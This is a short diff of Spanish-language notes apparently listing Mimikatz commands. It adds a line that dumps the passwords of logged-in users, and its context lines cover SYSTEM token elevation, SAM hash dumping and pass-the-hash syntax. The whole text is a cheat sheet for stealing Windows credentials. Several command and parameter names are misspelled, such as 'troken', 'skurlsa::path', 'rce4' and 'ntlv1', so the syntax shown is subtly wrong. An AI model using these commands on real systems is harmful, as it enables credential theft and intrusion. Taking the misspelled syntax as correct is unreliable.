@@ -3,6 +3,8 @@
   -> troken::elevate -> pasa a nt/authority system
   -> lsadump::sam -> vuelca los hashes de los usuarios locales
   
+  -> sekurlsa::logonpasswords (da las contraseñas de los usuarios que tengan una sesión activa)
+  
   sintaxis pass the hash:
   
     -> skurlsa::path /user:<usuario> /domain:. /rce4:<hash_ntlv1>
